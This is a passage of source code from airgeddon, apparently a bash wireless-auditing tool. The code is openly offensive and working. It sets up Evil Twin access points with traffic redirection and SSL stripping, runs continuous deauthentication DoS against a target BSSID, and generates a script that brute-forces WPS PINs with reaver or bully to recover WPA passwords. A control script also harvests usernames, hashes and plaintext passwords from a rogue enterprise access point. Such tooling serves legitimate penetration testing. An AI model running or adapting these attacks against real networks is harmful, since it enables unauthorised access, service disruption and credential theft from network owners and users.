				dhcp_path="/etc/${dhcpd_file}"
			fi
			dhcpd_path_changed=1
		fi
	fi
}

#Change mac of desired interface
function set_spoofed_mac() {

	debug_print

	current_original_mac=$(cat < "/sys/class/net/${1}/address" 2> /dev/null)

	if [ "${spoofed_mac}" -eq 0 ]; then
		spoofed_mac=1
		declare -gA original_macs
		original_macs["${1}"]="${current_original_mac}"
	else
		if [ -z "${original_macs[${1}]}" ]; then
			original_macs["${1}"]="${current_original_mac}"
		fi
	fi

	new_random_mac=$(od -An -N6 -tx1 /dev/urandom | sed -e 's/^  *//' -e 's/  */:/g' -e 's/:$//' -e 's/^\(.\)[13579bdf]/\10/')

	ip link set "${1}" down > /dev/null 2>&1
	ip link set dev "${1}" address "${new_random_mac}" > /dev/null 2>&1
	ip link set "${1}" up > /dev/null 2>&1
}

#Restore spoofed macs to original values
function restore_spoofed_macs() {

	debug_print

	for item in "${!original_macs[@]}"; do
		ip link set "${item}" down > /dev/null 2>&1
		ip link set dev "${item}" address "${original_macs[${item}]}" > /dev/null 2>&1
		ip link set "${item}" up > /dev/null 2>&1
	done
}

#Set routing state and firewall rules for Evil Twin attacks
function set_std_internet_routing_rules() {

	debug_print

	control_routing_status "start"
	if [ ! -f "${system_tmpdir}${routing_tmp_file}" ]; then
		save_iptables_nftables
	fi

	ip addr add "${et_ip_router}/${std_c_mask}" dev "${interface}" > /dev/null 2>&1
	ip route add "${et_ip_range}/${std_c_mask_cidr}" dev "${interface}" table local proto static scope link > /dev/null 2>&1
	routing_modified=1

	clean_initialize_iptables_nftables "start"

	echo "1" > /proc/sys/net/ipv4/ip_forward 2> /dev/null

	if [ "${et_mode}" = "et_captive_portal" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip nat_"${airgeddon_instance_name}" prerouting_"${airgeddon_instance_name}" iifname "${interface}" tcp dport "${www_port}" counter dnat to "${et_ip_router}:${www_port}"
			"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" tcp dport "${www_port}" counter accept
			"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" tcp dport "${https_port}" counter accept
			"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" udp dport "${dns_port}" counter accept
		else
			"${iptables_cmd}" -t nat -A PREROUTING -p tcp -i "${interface}" --dport "${www_port}" -j DNAT --to-destination "${et_ip_router}:${www_port}"
			"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -p tcp -i "${interface}" --destination-port "${www_port}" -j ACCEPT
			"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -p tcp -i "${interface}" --destination-port "${https_port}" -j ACCEPT
			"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -p udp -i "${interface}" --destination-port "${dns_port}" -j ACCEPT
		fi
	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" tcp dport "${bettercap_proxy_port}" counter accept
			"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" udp dport "${bettercap_dns_port}" counter accept
			"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${loopback_interface}" counter accept
		else
			"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -p tcp -i "${interface}" --destination-port "${bettercap_proxy_port}" -j ACCEPT
			"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -p udp -i "${interface}" --destination-port "${bettercap_dns_port}" -j ACCEPT
			"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -i "${loopback_interface}" -j ACCEPT
		fi
	elif [ "${et_mode}" = "et_sniffing_sslstrip2_beef" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" tcp dport "${bettercap_proxy_port}" counter accept
			"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" udp dport "${bettercap_dns_port}" counter accept
			"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${loopback_interface}" counter accept
			"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" tcp dport "${beef_port}" counter accept
		else
			"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -p tcp -i "${interface}" --destination-port "${bettercap_proxy_port}" -j ACCEPT
			"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -p udp -i "${interface}" --destination-port "${bettercap_dns_port}" -j ACCEPT
			"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -i "${loopback_interface}" -j ACCEPT
			"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -p tcp -i "${interface}" --destination-port "${beef_port}" -j ACCEPT
		fi
	fi

	if [ "${et_mode}" != "et_captive_portal" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule nat_"${airgeddon_instance_name}" postrouting_"${airgeddon_instance_name}" ip saddr "${et_ip_range}/${std_c_mask_cidr}" oifname "${internet_interface}" counter masquerade
		else
			"${iptables_cmd}" -t nat -A POSTROUTING -s "${et_ip_range}/${std_c_mask}" -o "${internet_interface}" -j MASQUERADE
		fi
	fi

	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" ip daddr "${et_ip_router}/${ip_mask_cidr}" icmp type echo-request ct state new,related,established counter accept
		"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" ip daddr "${et_ip_router}/${ip_mask_cidr}" counter drop
	else
		"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -i "${interface}" -p icmp --icmp-type 8 -d "${et_ip_router}/${ip_mask}" -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
		"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -d "${et_ip_router}/${ip_mask}" -j DROP
	fi
	sleep 2
}

#Launch dhcpd server
function launch_dhcp_server() {

	debug_print

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			dchcpd_scr_window_position=${g1_bottomleft_window}
		;;
		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
			dchcpd_scr_window_position=${g3_middleleft_window}
		;;
		"et_sniffing_sslstrip2")
			dchcpd_scr_window_position=${g4_middleleft_window}
		;;
	esac

	rm -rf "/var/run/${dhcpd_pid_file}" 2> /dev/null
	manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${dchcpd_scr_window_position} -T \"DHCP\"" "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}clts.txt 2>&1" "DHCP"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "dhcpd -d -cf \"${dhcp_path}\" ${interface}"
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi

	sleep 2
}

#Execute DoS for Evil Twin and Enterprise attacks
function exec_et_deauth() {

	debug_print

	prepare_et_monitor

	case ${et_dos_attack} in
		"${mdk_command}")
			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
			echo "${bssid}" > "${tmpdir}bl.txt"
			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
		;;
		"Aireplay")
			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
		;;
		"Auth DoS")
			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} a -a ${bssid} -m"
		;;
	esac

	recalculate_windows_sizes
	if [ -n "${enterprise_mode}" ]; then
		deauth_scr_window_position=${g1_bottomleft_window}
	else
		case ${et_mode} in
			"et_onlyap")
				deauth_scr_window_position=${g1_bottomright_window}
			;;
			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
				deauth_scr_window_position=${g3_bottomleft_window}
			;;
			"et_sniffing_sslstrip2")
				deauth_scr_window_position=${g4_bottomleft_window}
			;;
		esac
	fi

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "${et_dos_attack}" "first_time"
		pid_control_pursuit_mode "${et_dos_attack}" &
	else
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth\"" "${deauth_et_cmd}" "Deauth"
		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
			et_processes+=($!)
		else
			get_tmux_process_id "${deauth_et_cmd}"
			et_processes+=("${global_process_pid}")
			global_process_pid=""
		fi

		sleep 1
	fi
}

#Create here-doc bash script used for wps pin attacks
function set_wps_attack_script() {

	debug_print

	rm -rf "${tmpdir}${wps_attack_script_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1

	bully_reaver_band_modifier=""
	if [[ "${wps_channel}" -gt 14 ]] && [[ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 1 ]]; then
		bully_reaver_band_modifier="-5"
	fi

	exec 7>"${tmpdir}${wps_attack_script_file}"

	wps_attack_tool="${1}"
	wps_attack_mode="${2}"
	local unbuffer
	if [ "${wps_attack_tool}" = "reaver" ]; then
		unbuffer=""
		case ${wps_attack_mode} in
			"pindb"|"custompin")
				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -f -N -g 1 -d 2 -vvv -p "
			;;
			"pixiedust")
				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -K 1 -N -vvv"
			;;
			"bruteforce")
				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -f -N -d 2 -vvv"
			;;
			"nullpin")
				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -f -N -g 1 -d 2 -vvv -p ''"
			;;
		esac
	else
		unbuffer="stdbuf -i0 -o0 -e0 "
		case ${wps_attack_mode} in
			"pindb"|"custompin")
				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -F -B -v ${bully_verbosity} -p "
			;;
			"pixiedust")
				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -d -v ${bully_verbosity}"
			;;
			"bruteforce")
				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -S -L -F -B -v ${bully_verbosity}"
			;;
		esac
	fi

	attack_cmd2=" | tee ${tmpdir}${wps_out_file}"

	cat >&7 <<-EOF
		#!/usr/bin/env bash

		script_wps_attack_tool="${wps_attack_tool}"
		script_wps_attack_mode="${wps_attack_mode}"
		attack_pin_counter=1
		script_interface="${interface}"
		script_wps_bssid="${wps_bssid}"
		script_wps_channel="${wps_channel}"
		script_bully_reaver_band_modifier="${bully_reaver_band_modifier}"
		colorize="${colorize}"
		user_homedir="${user_homedir}"

		case "\${script_wps_attack_mode}" in
			"pindb")
				script_pins_found=(${pins_found[@]})
				script_attack_cmd1="${unbuffer}timeout --foreground -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
				pin_header1="${white_color}Testing PIN "
			;;
			"custompin")
				current_pin=${custom_pin}
				script_attack_cmd1="${unbuffer}timeout --foreground -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
				pin_header1="${white_color}Testing PIN "
			;;
			"pixiedust")
				script_attack_cmd1="${unbuffer}timeout --foreground -s SIGTERM ${timeout_secs_per_pixiedust} ${attack_cmd1}"
				pin_header1="${white_color}Testing Pixie Dust attack${normal_color}"
			;;
			"bruteforce")
				script_attack_cmd1="${unbuffer} ${attack_cmd1}"
				pin_header1="${white_color}Testing all possible PINs${normal_color}"
			;;
			"nullpin")
				script_attack_cmd1="${unbuffer}timeout --foreground -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
				pin_header1="${white_color}Testing null PIN"
			;;
		esac

		pin_header2=" (${yellow_color}"
		pin_header3="${white_color})${normal_color}"
		script_attack_cmd2="${attack_cmd2}"

		#Delete the existing bully session files
		function clear_bully_session_files() {

			rm -rf "\${user_homedir}.bully/"*.run > /dev/null 2>&1
			rm -rf "\${user_homedir}.bully/"*.pins > /dev/null 2>&1
		}

		#Delete the existing reaver session files
		function clear_reaver_session_files() {

			rm -rf "/var/lib/reaver/"*.wpc > /dev/null 2>&1
			rm -rf "/var/lib/lib/reaver/"*.wpc > /dev/null 2>&1
			rm -rf "/etc/reaver/"*.wpc > /dev/null 2>&1
		}

		#Check if the password was obtained through the wps pin
		function manage_wps_pot() {

			if [ -n "\${2}" ]; then
				trophy_pin="\${2}"
			else
				trophy_pin="Null"
			fi

			echo "" > "${wpspotenteredpath}"
			{
			date +%Y-%m-%d
			echo -e "${wps_texts[${language},1]}"
			echo ""
			echo -e "BSSID: ${wps_bssid}"
			echo -e "${wps_texts[${language},2]}: ${wps_channel}"
			echo -e "ESSID: ${wps_essid}"
			echo ""
			echo "---------------"
			echo ""
			echo -e "PIN: \${trophy_pin}"
			echo -e "\${1}"
			echo ""
			echo "---------------"
			echo ""
			echo "${footer_texts[${language},0]}"
			} >> "${wpspotenteredpath}"

			echo ""
			echo -e "${white_color}${wps_texts[${language},0]}: ${yellow_color}${wpspotenteredpath}"
		}

		#Parse the output file generated by the attack
		function parse_output() {

			readarray -t LINES_TO_PARSE < <(cat < "${tmpdir}${wps_out_file}" 2> /dev/null)

			if [ "\${script_wps_attack_tool}" = "reaver" ]; then
				case "\${script_wps_attack_mode}" in
					"pindb"|"custompin"|"bruteforce"|"nullpin")
						failed_attack_regexp="^\[!\][[:space:]]WPS[[:space:]]transaction[[:space:]]failed"
						success_attack_badpin_regexp="^\[\-\][[:space:]]Failed[[:space:]]to[[:space:]]recover[[:space:]]WPA[[:space:]]key"
						success_attack_goodpin_regexp="^\[\+\][[:space:]]Pin[[:space:]]cracked"
						pin_cracked_regexp="^\[\+\][[:space:]]WPS[[:space:]]PIN:[[:space:]]'([0-9]{8})'"
						password_cracked_regexp="^\[\+\][[:space:]]WPA[[:space:]]PSK:[[:space:]]'(.*)'"
					;;
					"pixiedust")
						success_attack_goodpixie_pin_regexp="^(\[Pixie\-Dust\]|\[\+\])[[:space:]]*(\[\+\][[:space:]]*WPS|WPS)[[:space:]](pin|PIN):.*([0-9]{8})"
						success_attack_goodpixie_password_regexp=".*?\[\+\][[:space:]]WPA[[:space:]]PSK:[[:space:]]'(.*)'"
					;;
				esac
			else
				case "\${script_wps_attack_mode}" in
					"pindb"|"custompin"|"bruteforce")
						failed_attack_regexp="^\[\+\][[:space:]].*'WPSFail'"
						success_attack_badpin_regexp="^\[\+\][[:space:]].*'Pin[0-9][0-9]?Bad'"
						success_attack_goodpin_regexp="^\[\*\][[:space:]]Pin[[:space:]]is[[:space:]]'([0-9]{8})',[[:space:]]key[[:space:]]is[[:space:]]'(.*)'"
					;;
					"pixiedust")
						success_attack_goodpixie_pin_regexp="^(\[Pixie\-Dust\])[[:space:]](PIN|pin|Pin)[[:space:]](FOUND:)[[:space:]]([0-9]{8})"
						success_attack_goodpixie_password_regexp="^\[\*\][[:space:]]Pin[[:space:]]is[[:space:]]'[0-9]{8}',[[:space:]]key[[:space:]]is[[:space:]]'(.*)'"
					;;
				esac
			fi

			case "\${script_wps_attack_mode}" in
				"pindb"|"custompin"|"nullpin")
					for item in "\${LINES_TO_PARSE[@]}"; do
						if [ "\${script_wps_attack_tool}" = "reaver" ]; then
							if [[ "\${item}" =~ \${success_attack_goodpin_regexp} ]] || [[ "\${pin_cracked}" -eq 1 ]]; then
								if [[ "\${item}" =~ \${pin_cracked_regexp} ]]; then
									cracked_pin="\${BASH_REMATCH[1]}"
									continue
								elif [[ \${item} =~ \${password_cracked_regexp} ]]; then
									cracked_password="\${BASH_REMATCH[1]}"
									return 0
								fi
								pin_cracked=1
								continue
							elif [[ "\${item}" =~ \${success_attack_badpin_regexp} ]]; then
								return 2
							elif [[ "\${item}" =~ \${failed_attack_regexp} ]]; then
								return 1
							fi
						else
							if [[ "\${item}" =~ \${success_attack_goodpin_regexp} ]]; then
								cracked_pin="\${BASH_REMATCH[1]}"
								cracked_password="\${BASH_REMATCH[2]}"
								pin_cracked=1
								return 0
							elif [[ "\${item}" =~ \${failed_attack_regexp} ]]; then
								return 1
							elif [[ "\${item}" =~ \${success_attack_badpin_regexp} ]]; then
								return 2
							fi
						fi
					done
				;;
				"pixiedust")
					for item in "\${LINES_TO_PARSE[@]}"; do
						if [[ "\${item}" =~ \${success_attack_goodpixie_pin_regexp} ]]; then
							cracked_pin="\${BASH_REMATCH[4]}"
							pin_cracked=1
							continue
						elif [[ "\${item}" =~ \${success_attack_goodpixie_password_regexp} ]]; then
							cracked_password="\${BASH_REMATCH[1]}"
							return 0
						fi
					done
					if [ "\${pin_cracked}" -eq 1 ]; then
						return 0
					fi
				;;
				"bruteforce")
					for item in "\${LINES_TO_PARSE[@]}"; do
						if [ "\${script_wps_attack_tool}" = "reaver" ]; then
							if [[ "\${item}" =~ \${success_attack_goodpin_regexp} ]] || [[ "\${pin_cracked}" -eq 1 ]]; then
								if [[ "\${item}" =~ \${pin_cracked_regexp} ]]; then
									cracked_pin="\${BASH_REMATCH[1]}"
									continue
								elif [[ "\${item}" =~ \${password_cracked_regexp} ]]; then
									cracked_password="\${BASH_REMATCH[1]}"
									return 0
								fi
								pin_cracked=1
								continue
							fi
						else
							if [[ "\${item}" =~ \${success_attack_goodpin_regexp} ]]; then
								cracked_pin="\${BASH_REMATCH[1]}"
								cracked_password="\${BASH_REMATCH[2]}"
								pin_cracked=1
								return 0
							fi
						fi
					done
				;;
			esac
			return 3
		}

		#Prints message for pins on timeout
		function print_timeout() {

			echo
			if [ "\${script_wps_attack_mode}" = "pixiedust" ]; then
				timeout_msg="${white_color}Timeout for Pixie Dust attack${normal_color}"
			elif [ "\${script_wps_attack_mode}" = "nullpin" ]; then
				timeout_msg="${white_color}Timeout for null PIN${normal_color}"
			else
				timeout_msg="${white_color}Timeout for last PIN${normal_color}"
			fi

			echo -e "\${timeout_msg}"
		}

		pin_cracked=0
		this_pin_timeout=0
		case \${script_wps_attack_mode} in
			"pindb")
				for current_pin in "\${script_pins_found[@]}"; do
					possible_bully_timeout=0
					if [ "\${attack_pin_counter}" -ne 1 ]; then
						sleep 1.5
					fi
					bad_attack_this_pin_counter=0
					if [ "\${this_pin_timeout}" -eq 1 ]; then
						print_timeout
					fi

					echo
					echo -e "\${pin_header1}\${current_pin}\${pin_header2}\${attack_pin_counter}/\${#script_pins_found[@]}\${pin_header3}"
					if [ "\${script_wps_attack_tool}" = "bully" ]; then
						echo
						clear_bully_session_files
					else
						clear_reaver_session_files
					fi

					this_pin_timeout=0
					(set -o pipefail && eval "\${script_attack_cmd1}\${current_pin}\${script_attack_cmd2} \${colorize}")
					if [ "\$?" = "124" ]; then
						if [ "\${script_wps_attack_tool}" = "reaver" ]; then
							this_pin_timeout=1
						else
							possible_bully_timeout=1
						fi
					fi
					attack_pin_counter=\$((attack_pin_counter + 1))
					parse_output
					output="\$?"
					if [ "\${output}" = "0" ]; then
						break
					elif [ "\${output}" = "1" ]; then
						this_pin_timeout=1
						continue
					elif [ "\${output}" = "2" ]; then
						continue
					elif [[ "\${output}" = "3" ]] || [[ "\${this_pin_timeout}" -eq 1 ]] || [[ "\${possible_bully_timeout}" -eq 1 ]]; then
						if [ "\${this_pin_timeout}" -eq 1 ]; then
							continue
						fi
						bad_attack_this_pin_counter=\$((bad_attack_this_pin_counter + 1))
						if [ "\${bad_attack_this_pin_counter}" -eq 3 ]; then
							this_pin_timeout=1
							continue
						fi
						if [ "\${possible_bully_timeout}" -eq 1 ]; then
							this_pin_timeout=1
							continue
						fi
					fi
				done
			;;
			"custompin")
				possible_bully_timeout=0
				echo
				echo -e "\${pin_header1}\${current_pin}\${pin_header2}\${attack_pin_counter}/1\${pin_header3}"
				if [ "\${script_wps_attack_tool}" = "bully" ]; then
					echo
					clear_bully_session_files
				else
					clear_reaver_session_files
				fi

				(set -o pipefail && eval "\${script_attack_cmd1}\${current_pin}\${script_attack_cmd2} \${colorize}")
				if [ "\$?" = "124" ]; then
					if [ "\${script_wps_attack_tool}" = "reaver" ]; then
						this_pin_timeout=1
					else
						possible_bully_timeout=1
					fi
				fi

				parse_output
				output="\$?"
				if [[ "\${output}" != "0" ]] && [[ "\${output}" != "2" ]]; then
					if [ "\${this_pin_timeout}" -ne 1 ]; then
						if [ "\${output}" = "1" ]; then
							this_pin_timeout=1
						elif [ "\${possible_bully_timeout}" -eq 1 ]; then
							if [ "\${possible_bully_timeout}" -eq 1 ]; then
								this_pin_timeout=1
							fi
						fi
					fi
				fi
			;;
			"pixiedust")
				echo
				echo -e "\${pin_header1}"
				if [ "\${script_wps_attack_tool}" = "bully" ]; then
					echo
					clear_bully_session_files
				else
					clear_reaver_session_files
				fi

				(set -o pipefail && eval "\${script_attack_cmd1}\${script_attack_cmd2} \${colorize}")
				if [ "\$?" = "124" ]; then
					this_pin_timeout=1
				fi
				parse_output
			;;
			"bruteforce")
				echo
				echo -e "\${pin_header1}"
				if [ "\${script_wps_attack_tool}" = "bully" ]; then
					echo
					clear_bully_session_files
				else
					clear_reaver_session_files
				fi
				eval "\${script_attack_cmd1}\${script_attack_cmd2} \${colorize}"
				parse_output
			;;
			"nullpin")
				echo
				echo -e "\${pin_header1}"
				(set -o pipefail && eval "\${script_attack_cmd1}\${script_attack_cmd2} \${colorize}")
				if [ "\$?" = "124" ]; then
					this_pin_timeout=1
				fi
				parse_output
			;;
		esac

		if [ "\${pin_cracked}" -eq 1 ]; then
			echo
			pin_cracked_msg="${white_color}PIN cracked: ${yellow_color}"
			password_cracked_msg="${white_color}Password cracked: ${yellow_color}"
			password_not_cracked_msg="${white_color}Password was not cracked: ${yellow_color}Maybe because bad/low signal, or PBC activated on AP"
			echo -e "\${pin_cracked_msg}\${cracked_pin}"

			if [ -n "\${cracked_password}" ]; then
				echo -e "\${password_cracked_msg}\${cracked_password}"
				manage_wps_pot "\${cracked_password}" "\${cracked_pin}"
			else
				echo -e "\${password_not_cracked_msg}"
			fi
		fi

		if [ "\${this_pin_timeout}" -eq 1 ]; then
			print_timeout
		fi

		echo
		echo -e "${white_color}Close this window"
		read -r -d '' _ </dev/tty
	EOF

	exec 7>&-
	sleep 1
}

#Create here-doc bash script used for control windows on Enterprise attacks
function set_enterprise_control_script() {

	debug_print

	exec 7>"${tmpdir}${control_enterprise_file}"

	local control_msg
	if [ "${enterprise_mode}" = "smooth" ]; then
		control_msg=${enterprise_texts[${language},3]}
	else
		control_msg=${enterprise_texts[${language},4]}
	fi

	cat >&7 <<-EOF
		#!/usr/bin/env bash

		interface="${interface}"
		et_initial_state="${et_initial_state}"
		interface_airmon_compatible=${interface_airmon_compatible}
		iface_monitor_et_deauth="${iface_monitor_et_deauth}"
		airmon="${airmon}"
		enterprise_returning_vars_file="${tmpdir}${enterprisedir}returning_vars.txt"
		enterprise_heredoc_mode="${enterprise_mode}"
		path_to_processes="${tmpdir}${et_processesfile}"
		path_to_channelfile="${tmpdir}${channelfile}"
		wpe_logfile="${tmpdir}${hostapd_wpe_log}"
		success_file="${tmpdir}${enterprisedir}${enterprise_successfile}"
		done_msg="${yellow_color}${enterprise_texts[${language},9]}${normal_color}"
		log_reminder_msg="${pink_color}${enterprise_texts[${language},10]}: [${normal_color}${enterprise_completepath}${pink_color}]${normal_color}"

		#Restore interface to its original state
		function restore_interface() {

			if hash rfkill 2> /dev/null; then
				rfkill unblock all > /dev/null 2>&1
			fi

			iw dev "\${iface_monitor_et_deauth}" del > /dev/null 2>&1

			if [ "\${et_initial_state}" = "Managed" ]; then
				ip link set "\${interface}" down > /dev/null 2>&1
				iw "\${interface}" set type managed > /dev/null 2>&1
				ip link set "\${interface}" up > /dev/null 2>&1
				ifacemode="Managed"
			else
				if [ "\${interface_airmon_compatible}" -eq 1 ]; then
					new_interface=\$(\${airmon} start "\${interface}" 2> /dev/null | grep monitor)

					[[ \${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="\${BASH_REMATCH[1]}"
					if [ "\${interface}" != "\${new_interface}" ]; then
						interface=\${new_interface}
						phy_interface=\$(basename "\$(readlink "/sys/class/net/\${interface}/phy80211")" 2> /dev/null)
						current_iface_on_messages="\${interface}"
					fi
				else
					ip link set "\${interface}" down > /dev/null 2>&1
					iw "\${interface}" set monitor control > /dev/null 2>&1
					ip link set "\${interface}" up > /dev/null 2>&1
				fi
				ifacemode="Monitor"
			fi
		}

		#Save some vars to a file to get read from main script
		function save_returning_vars_to_file() {
			{
			echo -e "interface=\${interface}"
			echo -e "phy_interface=\${phy_interface}"
			echo -e "current_iface_on_messages=\${current_iface_on_messages}"
			echo -e "ifacemode=\${ifacemode}"
			} > "\${enterprise_returning_vars_file}"
		}
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&7 <<-EOF
			#Function to kill tmux windows using window name
			function kill_tmux_windows() {

				local TMUX_WINDOWS_LIST=()
				local current_window_name
				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
						continue
					fi
					if [ -n "\${1}" ]; then
						if [ "\${current_window_name}" = "\${1}" ]; then
							continue
						fi
					fi
					tmux kill-window -t "${session_name}:\${current_window_name}"
				done
			}
		EOF
	fi

	cat >&7 <<-EOF
		#Kill Evil Twin Enterprise processes
		function kill_enterprise_windows() {

			readarray -t ENTERPRISE_PROCESSES_TO_KILL < <(cat < "\${path_to_processes}" 2> /dev/null)
			for item in "\${ENTERPRISE_PROCESSES_TO_KILL[@]}"; do
				kill "\${item}" &> /dev/null
			done
		}

		#Check if a hash or a password was captured (0=hash, 1=plaintextpass, 2=both)
		function check_captured() {

			local hash_captured=0
			local plaintext_password_captured=0
			readarray -t ENTERPRISE_LINES_TO_PARSE < <(cat < "\${wpe_logfile}" 2> /dev/null)
			for item in "\${ENTERPRISE_LINES_TO_PARSE[@]}"; do

				if [[ "\${item}" =~ challenge: ]]; then
					hash_captured=1
				elif [[ "\${item}" =~ password: ]]; then
					plaintext_password_captured=1
				fi
			done

			if [[ "\${hash_captured}" -eq 1 ]] || [[ "\${plaintext_password_captured}" -eq 1 ]]; then
				touch "\${success_file}" > /dev/null 2>&1
			fi

			if [[ "\${hash_captured}" -eq 1 ]] && [[ "\${plaintext_password_captured}" -eq 0 ]]; then
				echo 0 > "\${success_file}" 2> /dev/null
				return 0
			elif [[ "\${hash_captured}" -eq 0 ]] && [[ "\${plaintext_password_captured}" -eq 1 ]]; then
				echo 1 > "\${success_file}" 2> /dev/null
				return 0
			elif [[ "\${hash_captured}" -eq 1 ]] && [[ "\${plaintext_password_captured}" -eq 1 ]]; then
				echo 2 > "\${success_file}" 2> /dev/null
				return 0
			fi

			return 1
		}

		#Set captured hashes and passwords counters
		#shellcheck disable=SC2155
		function set_captured_counters() {

			declare -A lines_and_usernames

			readarray -t CAPTURED_USERNAMES < <(grep -n -E "username:" "\${wpe_logfile}" | sort -k 2,2 | uniq --skip-fields=1 2> /dev/null)
			for item in "\${CAPTURED_USERNAMES[@]}"; do
				[[ \${item} =~ ([0-9]+):.*username:[[:blank:]]+(.*) ]] && line_number="\${BASH_REMATCH[1]}" && username="\${BASH_REMATCH[2]}"
				lines_and_usernames["\${username}"]="\${line_number}"
			done

			hashes_counter=0
			plaintext_pass_counter=0
			for item2 in "\${lines_and_usernames[@]}"; do
				local line_to_check=\$((item2 + 1))
				local text_to_check=\$(sed "\${line_to_check}q;d" "\${wpe_logfile}" 2> /dev/null)
				if [[ "\${text_to_check}" =~ challenge: ]]; then
					hashes_counter=\$((hashes_counter + 1))
				elif [[ "\${text_to_check}" =~ password: ]]; then
					plaintext_pass_counter=\$((plaintext_pass_counter + 1))
				fi
			done
		}

		#Get last captured username
		function get_last_username() {

			line_with_last_user=\$(grep -E "username:" "\${wpe_logfile}" | tail -1)
			[[ \${line_with_last_user} =~ username:[[:blank:]]+(.*) ]] && last_username="\${BASH_REMATCH[1]}"
		}

		date_counter=\$(date +%s)
		last_username=""
		break_on_next_loop=0
		while true; do
			et_control_window_channel=\$(cat "\${path_to_channelfile}" 2> /dev/null)
			if [ "\${break_on_next_loop}" -eq 1 ]; then
				tput ed
			fi

